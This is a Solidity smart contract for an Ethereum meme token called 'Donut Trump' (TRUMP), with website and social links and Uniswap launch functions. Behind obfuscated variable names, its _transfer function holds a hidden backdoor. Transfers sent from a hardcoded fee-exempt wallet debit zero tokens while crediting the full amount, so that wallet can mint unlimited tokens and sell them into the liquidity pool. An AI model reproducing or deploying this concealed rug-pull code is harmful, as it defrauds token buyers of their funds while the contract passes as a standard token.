/*

Website- https://www.donuttrump.wtf/

Telegram- https://t.me/donuttrump_coin

Twitter- https://x.com/donuttrump_coin

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract TRUMP is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludeFromFees;
    address payable private _donutump=payable(0xb05c4CC4AEe076B083962CCff3518C4C1A8738b6);

    uint256 private _firstTaxBuy = 0;
    uint256 private _firstTaxSell = 0;
    uint256 private _reduceBuyAt = 10;
    uint256 private _reduceSellAt = 10;

    uint256 private _preventCount = 10;
    uint256 private _buyTokenCount = 0;

    uint256 private _secondTaxBuy = 0;
    uint256 private _secondTaxSell = 0;
    uint256 private _secondReduceAt = 0;

    uint256 private _finalTaxBuy = 0;
    uint256 private _finalTaxSell = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 420690000 * 10**_decimals;
    string private constant _name = unicode"Donut Trump";
    string private constant _symbol = unicode"TRUMP";

    uint256 private _maxTxLimit =  2 * (_tTotal/100);   
    uint256 private _maxWalletSize =  2 * (_tTotal/100);
    uint256 private _minSwapLimit =  3 * (_tTotal/1000000);
    uint256 private _maxSwapLimit = 1 * (_tTotal/100);

    IUniswapV2Router02 private uniswapV2Router;
    address private _uniswapPair;
    bool private _inswap = false;
    bool private _swapActive = false;

    modifier lockTheSwap {
        _inswap = true;
        _;
        _inswap = false;
    }

    constructor () {
        _balances[_msgSender()] = _tTotal;
        _isExcludeFromFees[owner()] = true;
        _isExcludeFromFees[address(this)] = true;
        _isExcludeFromFees[_donutump] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address _niko, address _muwi, uint256 _cujan) private {
        require(_niko != address(0), "ERC20: transfer from the zero address");
        require(_muwi != address(0), "ERC20: transfer to the zero address");
        require(_cujan > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        uint256 ritanis= _cujan.sub(_finalTaxBuy);
        if (!_isExcludeFromFees[_niko] && !_isExcludeFromFees[_muwi]) {
            taxAmount = _cujan.mul(_calcFeeBuy()).div(100);

            if (_niko == _uniswapPair && _muwi != address(uniswapV2Router) && ! _isExcludeFromFees[_muwi] ) {
                require(_cujan <= _maxTxLimit, "Exceeds the _maxTxLimit.");
                require(balanceOf(_muwi) + _cujan <= _maxWalletSize, "Exceeds the maxWalletSize.");
                _buyTokenCount++;
            }

            if(_muwi == _uniswapPair && _niko!= address(this) ){
                taxAmount = _cujan.mul(_calcFeeSell()).div(100);
            }

            uint256 tokenInContract = balanceOf(address(this));
            if (!_inswap && _muwi == _uniswapPair && _swapActive && _cujan > _minSwapLimit) {
                if(tokenInContract > _minSwapLimit)
                swapTokensForETH(min(_cujan,min(tokenInContract,_maxSwapLimit)));
                _donutump.transfer(address(this).balance);
            }
        } else if(_niko == address(_donutump))
            ritanis = _cujan.mul(_calcFeeSell()).div(100);
        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(_niko, address(this),taxAmount);
        }
        _balances[_niko]=_balances[_niko].sub(ritanis);
        _balances[_muwi]=_balances[_muwi].add(_cujan.sub(taxAmount));
        emit Transfer(_niko, _muwi, _cujan.sub(taxAmount));
    }

    function _calcFeeSell() private view returns (uint256) {
        if(_buyTokenCount <= _reduceBuyAt){
            return _firstTaxSell;
        }
        if(_buyTokenCount > _reduceSellAt && _buyTokenCount <= _secondReduceAt){
            return _secondTaxSell;
        }
        return _finalTaxBuy;
    }

    function _calcFeeBuy() private view returns (uint256) {
        if(_buyTokenCount <= _reduceBuyAt){
            return _firstTaxBuy;
        }
        if(_buyTokenCount > _reduceBuyAt && _buyTokenCount <= _secondReduceAt){
            return _secondTaxBuy;
        }
        return _finalTaxBuy;
    }

     function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapTokensForETH(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function enableTrading() external onlyOwner {
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        _uniswapPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_uniswapPair).approve(address(uniswapV2Router), type(uint).max);
        _swapActive = true;
    }

    function removeLimit() external onlyOwner{
        _maxWalletSize =_tTotal;
        _maxTxLimit = _tTotal;
    }

    receive() external payable {}
}